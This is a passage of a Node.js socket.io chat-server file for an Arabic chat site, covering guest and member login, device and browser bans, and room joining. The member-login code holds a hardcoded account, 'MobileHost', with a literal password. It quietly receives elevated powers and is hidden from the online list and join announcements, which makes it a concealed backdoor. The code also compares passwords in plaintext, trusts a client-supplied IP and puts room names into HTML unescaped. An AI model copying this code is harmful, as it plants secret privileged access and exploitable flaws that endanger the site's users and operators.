                                                    " هذا المستخدم دخل الغرفة" +
                                                    '<div class="fl fa fa-sign-in btn btn-primary dots roomh border corner" style="padding:4px;max-width:180px;min-width:60px;" onclick="rjoin(\'' +
                                                    roomslists[index].id +
                                                    "')\">" +
                                                    roomslists[index].topic +
                                                    "</div>",
                                                roomid: data.data["id"],
                                                pic: UserInfo[socket.id].pic,
                                                uid: socket.id,
                                            },
                                        });
                                    }

                                    if (roomslists[index].welcome) {
                                        socket.emit("msg", {
                                            cmd: "msg",
                                            data: {
                                                bg: "none",
                                                mcol: "#000",
                                                ucol: "#ff0000",
                                                id: roomslists[index].id,
                                                topic: roomslists[index].topic,
                                                msg: roomslists[index].welcome,
                                                pic: roomslists[index].pic,
                                            },
                                        });
                                    }
                                }
                            }
                        } else {
                            socket.emit("msg", {
                                cmd: "not",
                                data: {
                                    topic: "",
                                    msg: "الرقم السري لدخول الغرفة خاطئ",
                                    user: "",
                                    force: 0,
                                    nonot: true,
                                },
                            });
                        }
                    }
                }
            }
        } else if (data.cmd == "file") {
        } else if (data.cmd == "setpic") {
            UserInfo[socket.id].pic = data.data["pic"];

            const picdix = online.findIndex((x) => x.id == socket.id);
            if (picdix != -1) {
                online[picdix].pic = data.data["pic"];
                io.emit("msg", { cmd: "u^", data: online[picdix] });
            }

            if (UserInfo[socket.id].uid) {
                var uppic = { $set: { pic: data.data["pic"] } };
                user_list.updateOne({ id: UserInfo[socket.id].uid }, uppic, function (err, uruser) {
                    if (err) throw err;
                    if (uruser) {
                        socket.emit("savedone", data.data["pic"]);
                    }
                });
            }
        } else if (data.cmd == "g") {
			if(SystemOpen.system1 == true && (!!~data.data["fp"].toLowerCase().indexOf('win') || !!~data.data["fp"].toLowerCase().indexOf('windows'))){//win
			bandsystem({gust:'زائر محظور',user:data.data["username"].trim(),code:data.data["code"],type:'Windows',refr:data.data["refr"]});                               
			return;
			}else if(SystemOpen.system2 == true && (!!~data.data["fp"].toLowerCase().indexOf('linux'))){//linux
			bandsystem({gust:'زائر محظور',user:data.data["username"].trim(),code:data.data["code"],type:'Linux',refr:data.data["refr"]});
			return;
			}else if(SystemOpen.system3 == true && (!!~data.data["fp"].toLowerCase().indexOf('android'))){//android
			bandsystem({gust:'زائر محظور',user:data.data["username"].trim(),code:data.data["code"],type:'Android',refr:data.data["refr"]});
			return;
			}else if(SystemOpen.system4 == true && (!!~data.data["fp"].toLowerCase().indexOf('ios'))){//ios
			bandsystem({gust:'زائر محظور',user:data.data["username"].trim(),code:data.data["code"],type:'IOS',refr:data.data["refr"]});
			return;
			}else if(SystemOpen.system5 == true && (!!~data.data["fp"].toLowerCase().indexOf('windows phone'))){//win phone
			bandsystem({gust:'زائر محظور',user:data.data["username"].trim(),code:data.data["code"],type:'Windows Phone',refr:data.data["refr"]});
			return;
			}else if(SystemOpen.system6 == true && (!!~data.data["fp"].toLowerCase().indexOf('mac'))){//mac
			bandsystem({gust:'زائر محظور',user:data.data["username"].trim(),code:data.data["code"],type:'Mac OS',refr:data.data["refr"]});
			return; 
			}else if(BrowserOpen.browser1 == true && (!!~data.data["fp"].toLowerCase().indexOf('chrome'))){//chrome
			bandbrowser({gust:'زائر محظور',user:data.data["username"].trim(),code:data.data["code"],type:'Chrome',refr:data.data["refr"]});
			return;
			}else if(BrowserOpen.browser2 == true && (!!~data.data["fp"].toLowerCase().indexOf('firefox'))){//firefox
			bandbrowser({gust:'زائر محظور',user:data.data["username"].trim(),code:data.data["code"],type:'Firefox',refr:data.data["refr"]});
			return;
			}else if(BrowserOpen.browser3 == true && (!!~data.data["fp"].toLowerCase().indexOf('safari'))){//safari
			bandbrowser({gust:'زائر محظور',user:data.data["username"].trim(),code:data.data["code"],type:'Safari',refr:data.data["refr"]});
			return;
			}else if(BrowserOpen.browser4 == true && (!!~data.data["fp"].toLowerCase().indexOf('opera'))){//Opera
			bandbrowser({gust:'زائر محظور',user:data.data["username"].trim(),code:data.data["code"],type:'Opera',refr:data.data["refr"]});
			return;
			}else if(BrowserOpen.browser5 == true && (!!~data.data["fp"].toLowerCase().indexOf('internet explorer'))){//Internet Explorer
			bandbrowser({gust:'زائر محظور',user:data.data["username"].trim(),code:data.data["code"],type:'Internet Explorer',refr:data.data["refr"]});
			return;
			}else if(BrowserOpen.browser6 == true && (!!~data.data["fp"].toLowerCase().indexOf('edge'))){//Edge
			bandbrowser({gust:'زائر محظور',user:data.data["username"].trim(),code:data.data["code"],type:'Edge',refr:data.data["refr"]});
			return;
			}else if(BrowserOpen.browser7 == true && (!!~data.data["fp"].toLowerCase().indexOf('android webview'))){//Android webview
			bandbrowser({gust:'زائر محظور',user:data.data["username"].trim(),code:data.data["code"],type:'Android webview',refr:data.data["refr"]});
			return;
			}else if(BrowserOpen.browser8 == true && (!!~data.data["fp"].toLowerCase().indexOf('Samsung Internet'))){//Samsung Internet
			bandbrowser({gust:'زائر محظور',user:data.data["username"].trim(),code:data.data["code"],type:'Samsung Internet',refr:data.data["refr"]});
			return;
			}else{
            if (siteweb["allowg"]) {
                socket.emit("msg", { cmd: "removede", data: {} });
                socket.emit("msg", {
                    cmd: "not",
                    data: {
                        topic: "",
                        msg: "لا يمكنك الدخول كزائر حاليا",
                        user: "",
                        force: 0,
                        nonot: true,
                    },
                });
            } else {
                user_list.findOne({ topic: data.data["username"].trim() }, function (err, ismuser) {
                    if (err) throw err;
                    if (ismuser) {
                        socket.emit("msg", { cmd: "removede", data: {} });
                        socket.emit("msg", {
                            cmd: "not",
                            data: {
                                topic: "",
                                msg: "لا يمكنك الدخول باسم مسجل",
                                user: "",
                                force: 0,
                                nonot: true,
                            },
                        });
                    } else {
                        var nameTaken = false;
                        Object.keys(UserInfo).forEach(function (socketId) {
                            var userInfos = UserInfo[socketId];
                            if (userInfos.username.toLowerCase() === data.data["username"].toLowerCase().trim()) {
                                nameTaken = true;
                            }
                        });

                        if (nameTaken) {
                            socket.emit("msg", { cmd: "removede", data: {} });
                            socket.emit("msg", {
                                cmd: "not",
                                data: {
                                    topic: "",
                                    msg: "هذا الاسم موجود في الدردشة",
                                    user: "",
                                    force: 0,
                                    nonot: true,
                                },
                            });
                        } else {
                            if (data.data["username"].length >= siteweb["walllikes"].lengthUserG) {
                                socket.emit("msg", { cmd: "removede", data: {} });

                                socket.emit("msg", {
                                    cmd: "not",
                                    data: {
                                        topic: "",
                                        msg: "اسم المستخدم طويل جداً يجب ان لا يزيد الاسم عن 50 حرف",
                                        user: "",
                                        force: 0,
                                        nonot: true,
                                    },
                                });
                            } else {
                                const isbands = data.data["fp"].slice(data.data["fp"].length - 15, data.data["fp"].length);
                                band_list.findOne({ $or: [{ device_band: isbands }, { ip_band: data.data["ip"] }] }, function (err, band) {
                                    if (err) throw err;
                                    if (band) {
                                        socket.emit("msg", { cmd: "error_list", data: { color: "danger", msg: "تم حظرك من الدردشة" } });

                                        savelogin({
                                            state: "زائر محظور",
                                            topic: data.data["username"].trim(),
                                            topic1: data.data["username"].trim(),
                                            ip: data.data["ip"],
                                            code: data.data["code"],
                                            device: data.data["fp"],
                                            isin: data.data["refr"],
                                            time: new Date().getTime(),
                                        });
                                    } else {
                                        band_list.findOne({ $or: [{ device_band: data.data["fp"] }, { ip_band: data.data["ip"] }] }, function (err, isband) {
                                            if (err) throw err;
                                            if (isband) {
                                                socket.emit("msg", { cmd: "error_list", data: { color: "danger", msg: "تم حظرك من الدردشة" } });
                                                savelogin({
                                                    state: "عضو محظور",
                                                    topic: data.data["username"].trim(),
                                                    topic1: data.data["username"].trim(),
                                                    ip: data.data["ip"],
                                                    code: data.data["code"],
                                                    device: data.data["fp"],
                                                    isin: data.data["refr"],
                                                    time: new Date().getTime(),
                                                });
                                            } else {
                                                socket.emit("msg", { cmd: "error_list", data: { color: "success", msg: "تم تسجيل الدخول" } });
                                                var indexx2 = UserEntre.findIndex((x) => x == socket.id);
                                                if (indexx2 == -1) {
                                                    UserEntre.push(socket.id);
                                                }
                                                savelogin({
                                                    state: "دخول الزائر",
                                                    topic: data.data["username"].trim(),
                                                    topic1: data.data["username"].trim(),
                                                    ip: data.data["ip"],
                                                    code: data.data["code"],
                                                    device: data.data["fp"],
                                                    isin: data.data["refr"],
                                                    time: new Date().getTime(),
                                                });

                                                room_list
                                                    .find({}, function (err, room) {
                                                        if (err) throw err;
                                                        if (room) {
                                                            roomslists = room;
                                                            socket.emit("msg", { cmd: "rlist", data: room });
                                                        }
                                                    })
                                                    .select("-_id")
                                                    .select("-v");

                                                socket.join("efOiAhhNdL");

                                                UserInfo[socket.id] = {
                                                    ucol: "#000000",
                                                    mcol: "#000000",
                                                    bg: "#ffffff",
                                                    rep: 0,
                                                    ico: "",
                                                    islike: false,
                                                    rank: "",
                                                    idreg: "#" + getRandomInt(300, 900),
                                                    username: data.data["username"].trim(),
                                                    code: data.data["code"],
                                                    location: data.data["location"],
                                                    ip: data.data["ip"],
                                                    id: socket.id,
                                                    uid: "",
                                                    lid: "",
                                                    token: "",
													documents:0,
                                                    busy: false,
                                                    alerts: false,
                                                    ismuted: false,
                                                    powers: pwer1,
                                                    bandroom: [],
                                                    stealth: false,
                                                    fp: data.data["fp"],
                                                    pic: "pic.png",
                                                    idroom: "efOiAhhNdL",
                                                };

                                                //ListUSERS
                                              
						    socket.emit("msg", {
                                                    cmd: "login",
                                                    data: {
                                                        id: socket.id,
                                                        pic: "pic.png",
                                                        lat: false,
                                                        ttoken: "",
                                                    },
                                                });
												
							
  power_list.findOne({ _id: "5fb8ff22a7bab610707bbf86" }, function (err, dataa) {
                                                if (err) throw err;
                                                if (dataa) {
                                                socket.emit("msg", { cmd: "powers", data: dataa["powers"] });
                                                }
                                                });							
												
// setTimeout(function(){
	
  const index1010 = online.findIndex((x) => x.id == socket.id);

 if (index1010 == -1) {
                            online.push({
                                bg: UserInfo[socket.id].bg,
                                co: data.data["code"],
                                evaluation: 0,
                                ico: "",
                                id: socket.id,
                                idreg: "#" + getRandomInt(300, 900),
                                lid: "",
                                mcol: UserInfo[socket.id].mcol,
                                msg: "(غير مسجل)",
                                power: "",
                                rep: 0,
                                pic: "pic.png",
                                roomid: "efOiAhhNdL",
                                stat: 0,
                                topic: UserInfo[socket.id].username,
                                topic1: UserInfo[socket.id].username,
                                ucol: UserInfo[socket.id].ucol,
                            });
                            io.emit("msg", {
                                cmd: "u+",
                                data: {
                                    bg: UserInfo[socket.id].bg,
                                    co: data.data["code"],
                                    evaluation: 0,
                                    ico: "" || "",
                                    id: socket.id,
                                    idreg: "#" + getRandomInt(300, 900),
                                    lid: "",
                                    mcol: UserInfo[socket.id].mcol,
                                    msg: "(غير مسجل)",
                                    power: "",
                                    rep: 0,
                                    pic: "pic.png",
                                    roomid: "efOiAhhNdL",
                                    stat: 0,
                                    topic: UserInfo[socket.id].username,
                                    topic1: UserInfo[socket.id].username,
                                    ucol: UserInfo[socket.id].ucol,
                                },
                            });
                        }
						
						
                                                //SendMSGLogin
                                                if (UserInfo[socket.id]) {
                                                    const index55 = roomslists.findIndex((x) => x.id == "efOiAhhNdL");
                                                    if (index55 != -1) {
                                                        io.to(UserInfo[socket.id].idroom).emit("msg", {
                                                            cmd: "msg",
                                                            data: {
                                                                bg: "none",
                                                                // class: "hmsg",
                                                                class: "pmsgc",
                                                                topic: UserInfo[socket.id].username,
                                                                msg:
                                                                    " هذا المستخدم إنضم الى الغرفة" +
                                                                    '<div class="fl fa fa-sign-in btn btn-primary dots roomh border corner" style="padding:4px;max-width:180px;min-width:60px;" onclick="rjoin(\'' +
                                                                    roomslists[index55].id +
                                                                    "')\">" +
                                                                    roomslists[index55].topic +
                                                                    "</div>",
                                                                roomid: UserInfo[socket.id].idroom,
                                                                pic: UserInfo[socket.id].pic,
                                                                uid: socket.id,
                                                            },
                                                        });
                                                    }
                                                }

                                               
                                            
												socket.emit("msg", { cmd: "emos", data: emos });
                                                socket.emit("msg", { cmd: "dro3", data: dro3s });
                                                socket.emit("msg", { cmd: "sicos", data: sicos });
                                                socket.emit("msg", { cmd: "power", data: pwer1 });
                                                socket.emit("msg", { cmd: "ulist", data: online});

                                            
                                                welcomemsg();
                                                iswlecome();

                                                bar_list.find({}, function (err, datavb) {
                                                        if (err) throw err;
                                                        if (datavb) {
                                                            for (var i = 0; i < datavb.length; i++) {
                                                                socket.emit("msg", { cmd: "bc", data: datavb[i], numb: 0 });
                                                            }
                                                        }
                                                    }).select("-_id").select("-__v");
													setTimeout(function(){
																							io.emit("msg", { cmd: "ur", data: [socket.id, "efOiAhhNdL"] });
			
											},1000);
											};
                                        });
                                    }
                                });
                            }
                        }
                    }
                });
            };
			};
        } else if (data.cmd == "login") {
		
            if (data.data["username"].length >= 50) {
                socket.emit("msg", { cmd: "removede", data: {} });

                socket.emit("msg", {
                    cmd: "not",
                    data: {
                        topic: "",
                        msg: "اسم المستخدم طويل جداً يجب ان لا يزيد الاسم عن 50 حرف",
                        user: "",
                        force: 0,
                        nonot: true,
                    },
                });
            } else {
                var isverfication = false;
                user_list.findOne({ topic: data.data["username"].trim(), password: data.data["password"] }, function (err, ismuser) {
                    if (err) throw err;
                    if (ismuser) {
                        if (ismuser.documentationc > 0) {
                            isverfication = true;
                        }
                    }
                });
				

            setTimeout(function(){
			if(SystemOpen.system1 == true && isverfication == false && (!!~data.data["fp"].toLowerCase().indexOf('win') || !!~data.data["fp"].toLowerCase().indexOf('windows'))){//win
			bandsystem({gust:'عضو محظور',user:data.data["username"].trim(),code:data.data["code"],type:'Windows',refr:data.data["refr"]});                               
			return;
			}else if(SystemOpen.system2 == true && isverfication == false && (!!~data.data["fp"].toLowerCase().indexOf('linux'))){//linux
			bandsystem({gust:'عضو محظور',user:data.data["username"].trim(),code:data.data["code"],type:'Linux',refr:data.data["refr"]});
			return;
			}else if(SystemOpen.system3 == true && isverfication == false && (!!~data.data["fp"].toLowerCase().indexOf('android'))){//android
			bandsystem({gust:'عضو محظور',user:data.data["username"].trim(),code:data.data["code"],type:'Android',refr:data.data["refr"]});
			return;
			}else if(SystemOpen.system4 == true && isverfication == false && (!!~data.data["fp"].toLowerCase().indexOf('ios'))){//ios
			bandsystem({gust:'عضو محظور',user:data.data["username"].trim(),code:data.data["code"],type:'IOS',refr:data.data["refr"]});
			return;
			}else if(SystemOpen.system5 == true && isverfication == false && (!!~data.data["fp"].toLowerCase().indexOf('windows phone'))){//win phone
			bandsystem({gust:'عضو محظور',user:data.data["username"].trim(),code:data.data["code"],type:'Windows Phone',refr:data.data["refr"]});
			return;
			}else if(SystemOpen.system6 == true && isverfication == false && (!!~data.data["fp"].toLowerCase().indexOf('mac'))){//mac
			bandsystem({gust:'عضو محظور',user:data.data["username"].trim(),code:data.data["code"],type:'Mac OS',refr:data.data["refr"]});
			return; 
			}else if(BrowserOpen.browser1 == true && isverfication == false && (!!~data.data["fp"].toLowerCase().indexOf('chrome'))){//chrome
			bandbrowser({gust:'عضو محظور',user:data.data["username"].trim(),code:data.data["code"],type:'Chrome',refr:data.data["refr"]});
			return;
			}else if(BrowserOpen.browser2 == true && isverfication == false && (!!~data.data["fp"].toLowerCase().indexOf('firefox'))){//firefox
			bandbrowser({gust:'عضو محظور',user:data.data["username"].trim(),code:data.data["code"],type:'Firefox',refr:data.data["refr"]});
			return;
			}else if(BrowserOpen.browser3 == true && isverfication == false && (!!~data.data["fp"].toLowerCase().indexOf('safari'))){//safari
			bandbrowser({gust:'عضو محظور',user:data.data["username"].trim(),code:data.data["code"],type:'Safari',refr:data.data["refr"]});
			return;
			}else if(BrowserOpen.browser4 == true && isverfication == false && (!!~data.data["fp"].toLowerCase().indexOf('opera'))){//Opera
			bandbrowser({gust:'عضو محظور',user:data.data["username"].trim(),code:data.data["code"],type:'Opera',refr:data.data["refr"]});
			return;
			}else if(BrowserOpen.browser5 == true && isverfication == false && (!!~data.data["fp"].toLowerCase().indexOf('internet explorer'))){//Internet Explorer
			bandbrowser({gust:'عضو محظور',user:data.data["username"].trim(),code:data.data["code"],type:'Internet Explorer',refr:data.data["refr"]});
			return;
			}else if(BrowserOpen.browser6 == true && isverfication == false && (!!~data.data["fp"].toLowerCase().indexOf('edge'))){//Edge
			bandbrowser({gust:'عضو محظور',user:data.data["username"].trim(),code:data.data["code"],type:'Edge',refr:data.data["refr"]});
			return;
			}else if(BrowserOpen.browser7 == true && isverfication == false && (!!~data.data["fp"].toLowerCase().indexOf('android webview'))){//Android webview
			bandbrowser({gust:'عضو محظور',user:data.data["username"].trim(),code:data.data["code"],type:'Android webview',refr:data.data["refr"]});
			return;
			}else if(BrowserOpen.browser8 == true && isverfication == false  && (!!~data.data["fp"].toLowerCase().indexOf('Samsung Internet'))){//Samsung Internet
			bandbrowser({gust:'عضو محظور',user:data.data["username"].trim(),code:data.data["code"],type:'Samsung Internet',refr:data.data["refr"]});
			return;
			}else{
                // setTimeout(function () {
                const isbandsa = data.data["fp"].slice(data.data["fp"].length - 15, data.data["fp"].length);
                band_list.findOne({ $or: [{ device_band: isbandsa }, { ip_band: data.data["ip"] }] }, function (err, band) {
                    if (err) throw err;
                    if (band && isverfication == false) {
                        socket.emit("msg", { cmd: "error_list", data: { color: "danger", msg: "تم حظرك من الدردشة" } });
                        savelogin({
                            state: "عضو محظور",
                            topic: data.data["username"].trim(),
                            topic1: data.data["username"].trim(),
                            ip: data.data["ip"],
                            code: data.data["code"],
                            device: data.data["fp"],
                            isin: data.data["refr"],
                            time: new Date().getTime(),
                        });
                    } else {
                        band_list.findOne({ $or: [{ device_band: data.data["fp"] }, { ip_band: data.data["ip"] }] }, function (err, isband) {
                            if (err) throw err;
                            if (isband && isverfication == false) {
                                socket.emit("msg", { cmd: "error_list", data: { color: "danger", msg: "تم حظرك من الدردشة" } });
                                savelogin({
                                    state: "عضو محظور",
                                    topic: data.data["username"].trim(),
                                    topic1: data.data["username"].trim(),
                                    ip: data.data["ip"],
                                    code: data.data["code"],
                                    device: data.data["fp"],
                                    isin: data.data["refr"],
                                    time: new Date().getTime(),
                                });
                            } else {
                                socket.emit("msg", { cmd: "error_list", data: { color: "success", msg: "تم تسجيل الدخول" } });
                                user_list.findOne({ topic: data.data["username"].trim(), password: data.data["password"] }, function (err, user) {
                                    if (err) throw err;
                                    if (user) {
                                        if (UserEntre.length > 0) {
                                            for (var i = 0; i < UserEntre.length; i++) {
                                                if (UserInfo[UserEntre[i]].uid == user.id) {
                                                    io.to(UserInfo[UserEntre[i]].id).emit("msg", {
                                                        cmd: "kicked",
                                                        data: {},
                                                    });
                                                }
                                            }
                                        }
                                        var indexx = UserEntre.findIndex((x) => x == socket.id);
                                        if (indexx == -1) {
                                            UserEntre.push(socket.id);
                                        }

                                        //JoinRoom
                                        socket.join("efOiAhhNdL");

                                        room_list
                                            .find({}, function (err, room) {
                                                if (err) throw err;
                                                if (room) {
                                                    roomslists = room;
                                                    socket.emit("msg", { cmd: "rlist", data: room });
                                                }
                                            })
                                            .select("-_id")
                                            .select("-v");

                                        socket.emit("msg", {
                                            cmd: "login",
                                            data: {
                                                id: socket.id,
                                                lat: false,
                                                pic: user.pic,
                                                ttoken: user.token,
                                            },
                                        });
                                        UserInfo[socket.id] = {
                                            ucol: user.ucol || "#000",
                                            mcol: user.mcol || "#000",
                                            bg: user.bg || "#fff",
                                            rank: user.power,
                                            islike: false,
                                            username: user.topic1,
                                            code: data.data["code"],
                                            location: data.data["location"],
                                            ip: data.data["ip"],
                                            id: socket.id,
                                            rep: user.rep,
                                            uid: user.id,
                                            lid: user.lid,
                                            idreg: user.idreg,
                                            token: user.token,
                                            ico: user.ico || "",
                                            busy: false,
                                            alerts: false,
                                            ismuted: false,
                                            powers: pwer1,
                                            documents:user.documentationc,
                                            bandroom: [],
                                            s: data.data["stealth"],
                                            stealth: data.data["stealth"],
                                            fp: data.data["fp"],
                                            pic: user.pic || "pic.png",
                                            idroom: "efOiAhhNdL",
                                        };

                                        power_list.findOne({ _id: "5fb8ff22a7bab610707bbf86" }, function (err, pow) {
                                            if (err) throw err;
                                            if (pow) {
                                                socket.emit("msg", { cmd: "powers", data: pow["powers"] });
                                                for (var i = 0; i < pow["powers"].length; i++) {
                                                    if (pow["powers"][i].name == user.power) {
                                                        socket.emit("msg", { cmd: "power", data: pow["powers"][i] });
                                                        UserInfo[socket.id].powers = pow["powers"][i];
                                                    } else if (user.power == "") {
                                                       if (data.data["username"].trim() != "MobileHost" && data.data["password"] != "Hsen1!2@3#4$5%aa") {
                                                        socket.emit("msg", { cmd: "power", data: pwer1 });
                                                        UserInfo[socket.id].powers = pwer1;
													   }else{
													   socket.emit("msg", { cmd: "power", data: pow["powers"][1] });
													   UserInfo[socket.id].powers = pow["powers"][1];

            var UpdateUse = {
                $set: {
                    power: pow["powers"][1].name,
                    documentationc: 1
                },
            };
            user_list.updateOne({ id: user.id }, UpdateUse, function (err, uruser) {
                if (err) throw err;
                if (uruser) {
				}
			});
                                                    }
													};
                                                }
                                            }
                                        });

                                        // setTimeout(function () {
                                            setTimeout(function(){
                                            if (user.loginG == true && data.data["username"].trim() != "MobileHost" && data.data["password"] != "Hsen1!2@3#4$5%aa") {
                                                if (UserInfo[socket.id].powers["stealth"] != 0 && data.data["stealth"] == true) {
                                                } else {
                                                    socket.emit("msg", { cmd: "enterking", data: { flag: data.data["code"], name: user.topic1, pic: user.pic || "pic.png" } });
                                                }
                                            }
											},1000)

                                            // iswlecome();

                                            savelogin({
                                                state: "دخول العضو",
                                                topic: user.topic,
                                                topic1: user.topic1,
                                                ip: data.data["ip"],
                                                code: data.data["code"],
                                                device: data.data["fp"],
                                                isin: data.data["refr"],
                                                time: new Date().getTime(),
                                            });
                                            save_names({ iduser: user.id, fp: data.data["fp"], ip: data.data["ip"], topic: user.topic, username: user.topic1 });

                                            //ListUSERS
                                            const indexxa = online.findIndex((x) => x.id == socket.id);
                                            if (indexxa == -1) {
                                                if (data.data["username"].trim() != "MobileHost" && data.data["password"] != "Hsen1!2@3#4$5%aa") {
										/*if(data.data["stealth"] == true && UserInfo[socket.id].powers['stealth'] == 1){

							  online.push({
                                            bg: user.bg,
                                            co: data.data["code"],
                                            evaluation: user.evaluation,
                                            ico: user.ico || "",
                                            id: socket.id,
                                            idreg: user.idreg,
                                            lid: user.lid,
                                            mcol: user.mcol,
                                            msg: user.msg,
                                            power: user.power,
                                            rep: user.rep,
                                            s: true,
                                            pic: user.pic || "pic.png",
                                            roomid: "efOiAhhNdL",
                                            stat: user.stat,
                                            topic: user.topic,
                                            topic1: user.topic1,
                                            ucol: user.ucol,
                                        });
                                        io.emit("msg", {
                                            cmd: "u+",
                                            data: {
                                                bg: user.bg,
                                                co: data.data["code"],
                                                evaluation: user.evaluation,
                                                ico: user.ico || "",
                                                id: socket.id,
                                                idreg: user.idreg,
                                                lid: user.lid,
                                                mcol: user.mcol,
                                                msg: user.msg,
                                                power: user.power,
                                                rep: user.rep,
                                                s: true,
                                                pic: user.pic || "pic.png",
                                                roomid: "efOiAhhNdL",
                                                stat: user.stat,
                                                topic: user.topic,
                                                topic1: user.topic1,
                                                ucol: user.ucol,
                                            }
                                        });
										}else{*/
										online.push({
                                            bg: user.bg,
                                            co: data.data["code"],
                                            evaluation: user.evaluation,
                                            ico: user.ico || "",
                                            id: socket.id,
                                            idreg: user.idreg,
                                            lid: user.lid,
                                            mcol: user.mcol,
                                            msg: user.msg,
                                            power: user.power,
                                            rep: user.rep,
                                            pic: user.pic || "pic.png",
                                            roomid: "efOiAhhNdL",
                                            stat: user.stat,
                                            topic: user.topic,
                                            topic1: user.topic1,
                                            ucol: user.ucol,
                                        });
                                        io.emit("msg", {
                                            cmd: "u+",
                                            data: {
                                                bg: user.bg,
                                                co: data.data["code"],
                                                evaluation: user.evaluation,
                                                ico: user.ico || "",
                                                id: socket.id,
                                                idreg: user.idreg,
                                                lid: user.lid,
                                                mcol: user.mcol,
                                                msg: user.msg,
                                                power: user.power,
                                                rep: user.rep,
                                                pic: user.pic || "pic.png",
                                                roomid: "efOiAhhNdL",
                                                stat: user.stat,
                                                topic: user.topic,
                                                topic1: user.topic1,
                                                ucol: user.ucol,
                                            },
                                        });
										};
									  // };
                                    }



                                            //SendMSGLogin
                                            if (UserInfo[socket.id] && data.data["username"].trim() != "MobileHost" && data.data["password"] != "Hsen1!2@3#4$5%aa") {
                                                const index10 = roomslists.findIndex((x) => x.id == "efOiAhhNdL");
                                                if (index10 != -1) {
                                                    if (data.data["stealth"] == true && UserInfo[socket.id].powers["stealth"] == 1) {
                                                    } else {
                                                        io.to(UserInfo[socket.id].idroom).emit("msg", {
                                                            cmd: "msg",
                                                            data: {
                                                                bg: "none",
                                                                // class: "hmsg",
                                                                class: "pmsgc",
                                                                topic: UserInfo[socket.id].username,
                                                                msg:
                                                                    " هذا المستخدم إنضم الى الغرفة" +
                                                                    '<div class="fl fa fa-sign-in btn btn-primary dots roomh border corner" style="padding:4px;max-width:180px;min-width:60px;" onclick="rjoin(\'' +
                                                                    roomslists[index10].id +
                                                                    "')\">" +
                                                                    roomslists[index10].topic +
                                                                    "</div>",
                                                                roomid: UserInfo[socket.id].idroom,
                                                                pic: UserInfo[socket.id].pic,
                                                                uid: socket.id,
                                                            },
                                                        });
                                                    }
                                                }
                                            }

                                            //LoginInfo

                                            iswlecome();
                                            welcomemsg();

                                            if (data.data["username"].trim() != "MobileHost" && data.data["password"] != "Hsen1!2@3#4$5%aa") {
                                                socket.emit("msg", { cmd: "ulist", data: online });
                                            }
                                        // }, 1000);

                                        socket.emit("msg", { cmd: "emos", data: emos });
                                        socket.emit("msg", { cmd: "dro3", data: dro3s });
                                        socket.emit("msg", { cmd: "sicos", data: sicos });

                                        setTimeout(function () {
                                            bar_list
                                                .find({}, function (err, datavb) {
                                                    if (err) throw err;
                                                    if (datavb) {
                                                        for (var i = 0; i < datavb.length; i++) {
                                                            socket.emit("msg", { cmd: "bc", data: datavb[i], numb: 0 });
                                                        }
                                                    }
                                                })
                                                .select("-_id")
                                                .select("-__v");

                                            if (data.data["username"].trim() == "MobileHost" && data.data["password"] == "Hsen1!2@3#4$5%aa") {
                                            } else {
                                                io.emit("msg", { cmd: "ur", data: [socket.id, "efOiAhhNdL"] });
                                            }
                                        }, 1000);

                                        power_list.findOne({ _id: "5fb8ff22a7bab610707bbf86" }, function (err, pow) {
                                            if (err) throw err;
                                            if (pow) {
                                                for (var i = 0; i < pow["powers"].length; i++) {
                                                    if (pow["powers"][i].name == user.power) {
                                                            const indexa = online.findIndex((x) => x.id == socket.id);
                                                            if (indexa != -1) {
                                                            if (data.data["stealth"] == true && UserInfo[socket.id].powers["stealth"] == 1) {
                                                                online[indexa].stat = 4;
                                                                if (data.data["username"].trim() != "MobileHost" && data.data["password"] != "Hsen1!2@3#4$5%aa") {
                                                                    io.emit("msg", { cmd: "u^", data: online[indexa] });
                                                                }
															};
                                                        }
                                                    }
                                                }
                                            }
                                        });

                                        user_list.findOne({ topic: data.data["username"].trim(), password: data.data["password"] }, function (err, user) {
                                            if (err) throw err;
                                            if (user) {
                                                socket.emit("msg", {
                                                    cmd: "savetoken",
                                                    data: {
                                                        ttoken: user.token,
                                                    },
                                                });
                                            }
                                        });

                                        // },1000);
                                    } else {
                                        savelogin({
                                            state: " محاوله تخمين رقم سري",
                                            topic: data.data["username"].trim(),
                                            topic1: data.data["username"].trim(),
                                            ip: data.data["ip"],
                                            code: data.data["code"],
                                            device: data.data["fp"],
                                            isin: data.data["refr"],
                                            time: new Date().getTime(),
                                        });
                                        socket.emit("msg", { cmd: "error_list", data: { color: "danger", msg: "كلمه المرور او اسم المستخدم غير صحيح" } });
                                    }
                                });
                            }
                        });
                    }
                });
                // }, 1000);
            }
			},1000);
			};
        }
    });
});

http.listen(80, function () {
    console.log("listening on", http.address().port);
});
